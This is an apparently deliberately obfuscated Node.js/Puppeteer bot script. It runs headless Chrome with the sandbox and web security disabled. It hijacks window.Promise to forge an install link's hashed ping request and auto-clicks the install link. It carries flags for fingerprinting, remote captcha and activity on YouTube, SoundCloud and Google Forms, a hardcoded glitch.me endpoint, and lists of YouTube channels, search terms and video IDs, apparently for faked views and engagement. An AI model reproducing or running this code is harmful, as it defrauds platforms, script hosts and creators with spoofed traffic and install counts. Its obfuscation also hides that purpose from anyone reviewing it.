              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1 * -0x1039 + -0x269b * 0x1 + 0xa9 * 0x22; J < 0x328 * 0x9 + -0x1 * 0x2429 + 0x811 * 0x1; ++J)
                K = Q[J - (0x83 * -0x3 + 0x77f + -0x5f3)] ^ Q[J - (0x10d9 * 0x2 + -0x71f * -0x5 + -0x4545)] ^ Q[J - (0x29 * 0x5b + -0x1 * -0x623 + 0xa54 * -0x2)] ^ Q[J - (0x1fe4 + 0x13e5 * 0x1 + -0x33b9 * 0x1)], Q[J] = K << -0x859 * 0x1 + -0x6 * 0x11d + 0xf08 | K >>> -0x10ee + 0x925 * 0x1 + -0xb * -0xb8;
              for (J = 0x1600 + -0x2 * 0xddd + 0x5ba * 0x1; J < 0x1c95 + 0xd * -0x1fc + -0x2b5; J += 0x5e0 * 0x2 + 0x1 * -0x1636 + 0xa7b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1044 + 0x1132 + -0xe9 | L >>> 0x6be * -0x4 + 0x63c + 0x1 * 0x14d7) + (M & N | ~M & O) + P + (-0x3cc13 * -0x161 + -0x6dee1279 * -0x1 + -0x18a7ff13) + Q[J] << -0x1d43 + -0x1416 + 0x1 * 0x3159) << -0x46 * 0x5f + -0x22b9 + 0x3cb8 | P >>> -0xb * -0x371 + -0x301 * 0xd + -0x1 * -0x14d) + (L & (M = M << 0x26e7 + 0x235d + -0x4a26 | M >>> -0x7 * -0x4eb + -0x2a9 * 0x9 + -0x6 * 0x1bf) | ~L & N) + O + (0x24435ce * -0x49 + -0x1 * -0x3d54ec8 + 0xfc20828f) + Q[J + (-0x9f7 * 0x1 + 0x17de + -0x1 * 0xde6)] << -0x1ce8 + 0x1 * -0x1bdf + 0x38c7) << 0xdbe * -0x1 + 0x2 * 0x8a1 + 0xb3 * -0x5 | O >>> 0x482 + -0x1a33 + 0x15cc) + (P & (L = L << 0x62c * -0x5 + 0x15f6 + 0x2 * 0x482 | L >>> -0x48a + -0x2f * 0x13 + 0x809 * 0x1) | ~P & M) + N + (0x3af3b7dd + -0x13363 * 0x6c53 + -0x19 * -0x6770c1d) + Q[J + (-0x498 + 0x359 * -0x1 + 0x7f3)] << 0x2 * -0xa93 + -0x148 * 0x3 + 0xc7f * 0x2) << -0x10b * -0x1e + 0x1020 + -0x2f65 | N >>> -0x1072 + 0x1e9b + -0xe0e) + (O & (P = P << 0xae7 * 0x1 + -0xd65 + 0x29c | P >>> -0x1e2 + 0x21cd + -0x1fe9) | ~O & L) + M + (-0x9b1172ed + -0x209fa8b8 + -0x7bf * -0x23ea42) + Q[J + (0x1c87 + -0xc28 + 0x574 * -0x3)] << -0x1267 * -0x2 + 0x1777 + -0x3c45) << 0xadf + 0xd76 + 0x185 * -0x10 | M >>> -0x24ee + 0x104b + 0x14be) + (N & (O = O << -0x7 * 0x571 + -0x256e + -0x4ba3 * -0x1 | O >>> -0x222d + 0x47b * -0x8 + 0x4607) | ~N & P) + L + (-0x46216bcc + 0x7a6f * -0xe947 + 0x11034e12e) + Q[J + (-0xc55 + -0x15 * 0x6a + 0x1 * 0x150b)] << 0x2 * 0x36 + 0x20af + -0x211b, N = N << 0xa5d + -0xd7c + 0x33d | N >>> -0x23f6 + 0x1 * -0x2418 + 0x2408 * 0x2;
              for (; J < -0x26e0 + 0x104e + -0xb5d * -0x2; J += -0xe * 0x1f3 + -0xc1 + 0x1c10)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0xb2d + 0x78 * -0x44 + 0x14b8 | L >>> -0x2061 + 0x1 * 0x177d + 0x31 * 0x2f) + (M ^ N ^ O) + P + (0x688f3963 * 0x2 + -0x18864799 + -0x49be3f8c) + Q[J] << -0x1f3 * 0x1 + 0x1b * 0x112 + -0x1af3 * 0x1) << -0x6e2 + 0x1ce9 + -0x1602 | P >>> -0x1 * -0x16a3 + -0x26c3 + 0x103b) + (L ^ (M = M << -0x37c + 0x12a0 + 0xf06 * -0x1 | M >>> 0x19dd + -0x17b8 + -0x223 * 0x1) ^ N) + O + (0xf8bd3d3 + 0x65660acb * -0x1 + 0xc4b42299) + Q[J + (0x1 * -0xb53 + 0x33b * -0x7 + 0x21f1 * 0x1)] << 0x2396 + 0x3ca + 0x9 * -0x460) << -0x1177 * -0x1 + 0x3 * -0x151 + -0xd7f | O >>> 0xd0f * -0x1 + -0x4d9 + 0x1203) + (P ^ (L = L << 0x156a + 0x1 * -0x1a37 + 0x4eb | L >>> 0x1865 * 0x1 + -0x13c2 + -0x4a1) ^ M) + N + (-0x16b72f3e + -0xc1e7ad36 + -0x14778c815 * -0x1) + Q[J + (0x58d * -0x5 + 0x236b * 0x1 + -0x5 * 0x188)] << -0x1 * -0x1bc7 + 0x3d5 * 0x1 + -0x1f9c) << -0xa7b * 0x2 + -0xf0b + -0x2406 * -0x1 | N >>> 0x25f * -0xd + 0x6a6 + 0x1848) + (O ^ (P = P << -0x1c65 + 0x58f + 0x16f4 | P >>> 0x208f + 0x13ee + -0x5 * 0xa7f) ^ L) + M + (-0x6c8c719b + 0xa9 * 0xc49f85 + 0x59990e6f) + Q[J + (0x22e4 + -0x20b3 + -0x22e)] << -0x1 * 0x1f6f + 0x1183 * 0x1 + 0xdec) << 0x12d1 * -0x1 + -0x51b * -0x5 + -0x23b * 0x3 | M >>> -0xa1f * 0x1 + 0x2329 + -0x1eb * 0xd) + (N ^ (O = O << 0x299 * -0x6 + 0x1c0b + 0x3 * -0x41d | O >>> -0x1c99 + 0x935 * -0x3 + 0x383a) ^ P) + L + (0x4717c1a4 + 0x2a56b3e1 + -0x29489e4) + Q[J + (-0x1 * -0x1fd0 + 0x36 * -0x84 + -0x3f4)] << 0x5 * 0x14f + -0x1 * 0xe41 + 0x7b6, N = N << 0x196b + -0x1f7 * -0x11 + 0x374 * -0x11 | N >>> 0x2643 + 0x1eb5 * 0x1 + -0x44f6;
              for (; J < 0x246c * 0x1 + 0x57e * 0x7 + -0x4aa2; J += -0xe2f + -0x2b * 0x6f + 0x20d9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xdfe + -0x101 * -0x13 + -0x210c | L >>> -0x6df * -0x1 + 0x30a * 0x4 + -0x12ec) + (M & N | M & O | N & O) + P - (-0x466 * -0x2edffc + 0x16141f * -0x95f + 0x719da33d) + Q[J] << -0x1038 + 0x263a + -0x1602) << -0x2 * -0x97d + 0x1 * 0x1ef5 + -0x31ea | P >>> -0x61 * -0x4a + 0x89 * -0x2e + -0x351) + (L & (M = M << -0x1476 + -0x388 * -0x7 + -0x424 | M >>> -0x7d8 + 0x1a1 + 0x639) | L & N | M & N) + O - (-0x12d67 * -0x155e + -0x251194c * 0x35 + 0xd286610e) + Q[J + (0xb5 * 0x6 + 0x5 * 0x62 + 0xaf * -0x9)] << -0x1df7 * 0x1 + -0x1 * -0xfb3 + 0xe44) << -0x253e + 0xcb0 + 0x1 * 0x1893 | O >>> -0xc4 + -0x2 * -0x12c7 + -0x24af * 0x1) + (P & (L = L << 0x2 * -0x2f9 + -0xc3d + 0x124d | L >>> 0x11d0 + -0xb01 + -0x6cd) | P & M | L & M) + N - (-0x989c5d * 0xb + 0x10 * 0x742bcc5 + 0x3472ed3) + Q[J + (-0x6b * -0x5c + -0x1f5a + -0x718)] << -0x221 * 0x1 + 0x43 * -0x40 + -0x64b * -0x3) << 0x1 * 0x235d + 0x9ec + 0x1 * -0x2d44 | N >>> 0x904 * 0x2 + -0x1b2e + 0x941) + (O & (P = P << -0x7 * -0x146 + -0x1 * 0x35 + -0x1 * 0x897 | P >>> -0x1 * -0xc6e + -0x1f35 + -0x1 * -0x12c9) | O & L | P & L) + M - (0x1578221c + 0x880c2a9b + -0x2ca00993) + Q[J + (0x11f1 + -0x5bb + -0x1 * 0xc33)] << 0xab3 * -0x1 + -0x92 * -0x10 + -0x1 * -0x193) << 0xb94 + -0x32b * 0x1 + 0x3 * -0x2cc | M >>> 0x5c * 0x30 + -0x1173 * -0x1 + -0x2298) + (N & (O = O << -0x2376 + 0x7e7 + -0xd * -0x221 | O >>> -0x233 * 0x4 + 0x1c6 + 0x708) | N & P | O & P) + L - (0x28a6f837 * -0x1 + 0xac4674b4 + 0x86d * -0x2391d) + Q[J + (0x54c + -0x4c * 0x58 + 0x14d8)] << -0x1 * -0x17cb + 0x3e6 * 0x4 + -0x2763, N = N << 0xa93 * 0x1 + 0x17b * 0x15 + -0x298c * 0x1 | N >>> -0x5 * -0x20e + 0x1 * 0x3e5 + -0xe29;
              for (; J < -0x5d8 + -0x224b + -0x1 * -0x2873; J += -0x874 + 0x1a76 + -0x11fd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x23c5 + 0x270a + -0x4aca | L >>> 0x2 * 0x6c7 + -0x1f9a + -0x1227 * -0x1) + (M ^ N ^ O) + P - (0x2 * -0x4681d6d + 0x26261a94 + 0x18475e70) + Q[J] << 0x1b * -0x67 + -0x49 + 0xb26) << -0x2410 * 0x1 + 0x4f5 + 0x1f20 | P >>> 0x245f * 0x1 + -0x94e * -0x1 + -0x2d92) + (L ^ (M = M << -0x1a09 + 0x407 * 0x8 + -0x611 * 0x1 | M >>> -0x696 + -0x6 * -0x26c + -0x1 * 0x7f0) ^ N) + O - (0xafa28c7 * -0x9 + 0x252096cb + 0x7348165e) + Q[J + (-0xcd4 + 0xc8 * -0x9 + -0x9 * -0x235)] << 0x3e * -0x2 + 0x12e8 + -0x126c) << 0x24f9 + -0x91 * -0x31 + -0x40b5 | O >>> 0x1 * -0x15fb + 0x26d5 + -0x10bf) + (P ^ (L = L << 0x88 * -0x8 + -0x12 * -0x119 + 0x3d9 * -0x4 | L >>> -0x220d + 0x65f + 0x1bb0) ^ M) + N - (-0x1b89b64 * 0x3e + -0x40433c4e + -0x10 * -0xe0961cb) + Q[J + (-0x1621 + 0x12d8 + 0x34b)] << 0x1bac + -0x2e * -0x7b + -0x2e * 0x115) << 0x1 * -0x1e4d + -0x128 * 0x2 + 0x2 * 0x1051 | N >>> -0x1 * 0xcfb + -0xb6b + 0x1881) + (O ^ (P = P << -0x1 * 0x1a6b + 0x1 * 0x329 + 0x4 * 0x5d8 | P >>> 0x1 * -0x97 + 0x529 + -0x490) ^ L) + M - (-0xaa39 * -0x6597 + 0x63925ec7 + 0x4 * -0x1c60814f) + Q[J + (0x1a57 + -0x1 * -0x1723 + -0x3177)] << 0xb5e + 0x4f7 * -0x1 + 0xb * -0x95) << -0x9d * -0x3d + -0x2562 + 0x2 * -0x1 | M >>> 0xcb5 + -0x1091 + -0x5 * -0xcb) + (N ^ (O = O << 0x203 * 0x8 + -0x1843 + 0x849 | O >>> 0x17 * 0x71 + -0xc * 0xc0 + -0x125) ^ P) + L - (0x69555752 * -0x1 + 0x589938b2 + 0x482 * 0xf9b25) + Q[J + (0x1 * -0x1a95 + 0x53 * -0x2c + 0x28dd)] << 0x1c9 * 0x5 + 0x88 + -0x3 * 0x327, N = N << 0x1234 + -0x20bd + 0xb * 0x155 | N >>> -0xeff * -0x2 + 0x15c * 0x17 + -0x50 * 0xc4;
              this['h0'] = this['h0'] + L << -0xb70 + 0x1172 + 0x2 * -0x301, this['h1'] = this['h1'] + M << 0x874 + -0x197 * -0x1 + -0xa0b, this['h2'] = this['h2'] + N << -0x22c2 + -0x1b9e + -0x7cc * -0x8, this['h3'] = this['h3'] + O << -0x2 * 0xcea + 0x1064 * 0x2 + 0x37a * -0x2, this['h4'] = this['h4'] + P << -0xd * -0x1d3 + 0xb5 * -0x1d + -0x336;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x11 * -0x4b + 0xdd7 + -0x8c0 & -0x21e1 + -0x148f * 0x1 + 0x367f] + w[J >> -0x1c4b + -0x1 * -0xf29 + 0x2 * 0x69d & 0x28 * 0xa7 + 0x171c + -0x3125] + w[J >> 0x10 * -0x8b + 0x2 * -0x3ac + 0x101c & 0xdf6 + 0x168 * -0xa + -0x1 * -0x29] + w[J >> -0x3 * 0x63a + 0x2d2 * 0x6 + 0x1d2 * 0x1 & -0x1 * -0x248c + -0x1868 + -0x1 * 0xc15] + w[J >> 0x1258 + 0x24ec * 0x1 + -0x3738 & -0x12fc + 0xddd + 0x52e] + w[J >> 0x20a8 + 0x67 * -0x53 + 0x1 * 0xc5 & 0x1327 * 0x1 + -0x82d + -0xaeb] + w[J >> -0x292 * 0xd + 0x69b * -0x3 + 0x353f & -0x1 * -0x1a04 + -0x5ff + -0x13f6] + w[0x1 * 0x21ec + -0x2f9 + -0x1ee4 & J] + w[K >> -0x1 * 0x1c84 + 0x1a2d + -0x273 * -0x1 & -0x206 + 0x24b7 + -0x22a2] + w[K >> -0x2eb + -0x1350 + 0x1653 & 0xdaa + -0x25bd + 0x1822] + w[K >> -0x1 * 0xa2d + 0x2637 + -0x1bf6 & 0x40d + -0x19e9 + 0x15eb] + w[K >> 0x6 * -0x25 + -0x7 * -0x10e + 0x1 * -0x674 & -0x1263 * -0x1 + -0x13 * -0x44 + 0x22 * -0xb0] + w[K >> -0x20c9 + -0x11f1 + -0x86 * -0x61 & -0xf85 + -0x215f + 0x30f3] + w[K >> -0x139e + -0x13 * -0x9a + 0x838 & -0x1b9a + 0x1392 + 0x1 * 0x817] + w[K >> -0xbc5 + -0x188b + 0x14 * 0x1d1 & 0x2 * -0xc17 + 0x1091 + 0x1eb * 0x4] + w[0x1f * 0x49 + -0x1 * -0x16fa + -0x1e * 0x10f & K] + w[L >> 0x1321 + -0xfe9 + -0x31c & -0xaac * -0x3 + 0x17 * -0x91 + -0x12ee] + w[L >> -0x1 * -0x11d7 + 0x1b31 * -0x1 + 0x972 & -0x1850 + 0x13f3 + -0x1 * -0x46c] + w[L >> -0x15ae + -0x4ff + 0x1ac1 & -0x1 * 0x81f + 0x18 * 0x176 + -0x1ae2] + w[L >> 0x15a * 0xa + -0x13e1 + 0x66d & 0x227e + -0x1 * 0x141a + 0xe55 * -0x1] + w[L >> 0x36e + 0x11ec * -0x2 + 0x22a * 0xf & -0x1e98 + -0x1445 * 0x1 + 0x32ec] + w[L >> 0x20b3 + 0x4 * -0x14b + 0x1b7f * -0x1 & 0x1 * -0x781 + -0x1a2c + 0x21bc] + w[L >> -0x2465 + -0x2070 + 0x44d9 & -0x239 * 0x1 + 0x326 * -0x5 + -0x903 * -0x2] + w[0x1c08 + 0x1 * -0x5 + -0x1bf4 & L] + w[M >> 0x4f0 + -0x57 * -0x53 + 0xb03 * -0x3 & -0x2521 * 0x1 + -0x13b5 * -0x1 + -0x1 * -0x117b] + w[M >> 0x20e9 + -0x1f7b * 0x1 + -0x156 & -0xc * -0x86 + -0x1f18 * -0x1 + -0x2551] + w[M >> -0x16b1 + 0x1 * 0x12be + 0x407 & -0x1707 + -0x1 * 0x267b + 0x3d91] + w[M >> -0x116a + -0x71 * -0x53 + -0x1329 * 0x1 & 0xec2 + -0x3 * -0x1c1 + -0x13f6] + w[M >> -0x17b6 + -0x10e7 + -0x5cf * -0x7 & -0x5 * -0x1de + 0xa1e + -0x1365] + w[M >> 0x1dc + 0x176c + -0x328 * 0x8 & 0xba2 + 0x6bb * -0x4 + -0xf59 * -0x1] + w[M >> -0x17eb + 0x221 * -0xf + 0x1 * 0x37de & -0x2 * 0x1035 + 0x179 * 0x1a + -0x5d1] + w[-0x2 * 0x32e + -0xa6 * -0x17 + -0x87f & M] + w[N >> -0x1cb9 + -0x87 + 0xeae * 0x2 & -0x1 * 0xb53 + 0x2 * -0x772 + 0x26 * 0xb1] + w[N >> 0x15aa + -0x1 * 0x1abf + 0x52d & 0x103a + -0x167 * -0x13 + -0x2ad0] + w[N >> 0x9 * -0x296 + -0xa89 + -0x21e3 * -0x1 & 0x515 + -0x1026 + 0xb20] + w[N >> -0x1feb + 0x2524 + -0x529 & 0x1bc3 + 0x1 * 0x1d3f + -0x38f3] + w[N >> 0x13a * -0x2 + -0xf56 + 0x11d6 & -0xae * 0x1d + -0x4db * -0x1 + -0x53 * -0x2e] + w[N >> 0x1 * -0x1f43 + 0xa8d * -0x1 + -0x34 * -0xce & 0xb7a + 0x1 * 0x767 + -0x12d2] + w[N >> 0x7 * -0x41b + -0x15a0 * 0x1 + 0x3261 & 0x25c4 + 0x2d2 + -0x2887] + w[-0x3 * 0xb09 + -0x730 + 0x285a & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x912 + -0x1a3 * -0x9 + -0x17b5 & 0x144c + -0x239 * 0x4 + 0x215 * -0x5,
                J >> 0x1 * -0x18a9 + 0x1cdb + -0x422 & -0x1a60 + -0x10fd * -0x2 + 0x1 * -0x69b,
                J >> 0x1000 + 0x44e * -0x9 + -0x16c6 * -0x1 & 0x610 + 0x891 + -0xa * 0x15d,
                0x674 + -0x12af * -0x1 + 0x2 * -0xc12 & J,
                K >> 0x29b * -0x3 + -0xd9f + 0x1588 & -0x17d4 + 0xf2 * -0x1f + 0x3621,
                K >> 0xbb0 + 0x4 * -0x2de + -0x28 & 0xb78 * -0x2 + 0x5 * -0x6e2 + 0x3a59,
                K >> 0x1c4d + -0x257a + 0x1 * 0x935 & -0x20f2 + 0xbaf + 0x1642,
                -0x6b * -0x5b + 0x6 * -0x4a0 + 0x1d * -0x52 & K,
                L >> -0x1090 + -0x25a8 + 0x3650 & -0x166a + 0x24a5 + -0xd3c,
                L >> 0x5 * -0x399 + -0xa6a + -0x15b * -0x15 & 0xf70 + 0x7a3 * -0x1 + -0x6ce,
                L >> 0xa79 * 0x1 + 0x1f59 + 0xdee * -0x3 & 0x1b2 * 0x2 + -0x1728 + 0x14c3,
                0x35a + -0x6ab + 0x450 & L,
                M >> 0x1e8 * -0x7 + 0xdb * -0x3 + 0x1001 & -0x1b * 0x106 + 0x143a * 0x1 + 0x867,
                M >> 0x8 * -0x2ae + -0x137a + 0x28fa & -0x7 * 0x125 + -0x1a85 + 0x2387,
                M >> -0x49f + 0x29 + 0x47e & 0x1857 + 0x1fe0 + -0x1b9c * 0x2,
                -0x1 * -0x2647 + -0x203b + -0x50d & M,
                N >> -0x3e5 * 0x7 + -0x19 * 0xa3 + 0x2b46 & 0x141a + 0xf1 * -0x1b + 0x650,
                N >> 0x454 * -0x4 + 0x9cd + 0x793 * 0x1 & 0x17 * 0x67 + -0x1 * 0x1f3f + 0x16fd,
                N >> 0x8a7 * -0x3 + 0x1 * 0x2303 + -0x906 & -0x1cc7 + 0x26a2 + -0x8dc,
                0x193 * -0x5 + 0x1aa * -0x9 + 0x17d8 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x85d * -0x1 + 0x1 * -0x9ef + 0x1260), (K = new DataView(J))['setUint32'](0x1019 + -0x26ba + -0x16a1 * -0x1, this['h0']), K['setUint32'](0x1 * -0x1271 + 0x1 * 0x193 + 0x10e2, this['h1']), K['setUint32'](-0x35 * -0x2b + 0x1117 + 0xcfb * -0x2, this['h2']), K['setUint32'](0x1fc5 + 0xe10 + -0xf43 * 0x3, this['h3']), K['setUint32'](-0x425 * 0x7 + -0x3d3 * -0x3 + 0x119a, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1d7a + -0x172e + -0x64c];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x21a1 + 0x20 * -0x8 + -0x9 * -0x3d9;
            J[-0x26ab + -0x1544 + 0x3bef]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * 0x1b63 + 0x9bf + 0x11a4] = L => {
              const U = b;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open'](U(0x10, 'ygBv'), M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x43 * 0x6b + -0x24 * 0x2 + 0x11 * 0x1aa), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1 * -0x1069 + 0x195c + -0x8f2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x243f + -0x2425 * -0x1 + 0x5f6), Promise['resolve'](-0xf3b + -0x4e7 * -0x5 + 0x13 * -0x7d);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x166d * 0x1 + 0xa9 * -0x13 + 0x22f8; j < 0x1fd4 + 0x137f + -0x3352 * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x1 * 0x2f4b + -0x31b * 0xc + 0x713 * 0x3 + (0xb84 + -0x29 * -0x7f + -0x1423) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x95b * -0x1 + -0x53 * -0x2 + -0x8 * -0x117) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require(V(0x1c, 'MA!)')),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1de + -0xeea + 0xd0c; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + W(0x0) + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + X(0x18) + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1dff * -0x1 + -0x1 * -0x79f + -0x97 * -0x26)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x22e2 + 0x21a3 + 0x1 * -0x447b)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + W(0xe) + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x111 + 0xd * 0x19 + -0x253);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
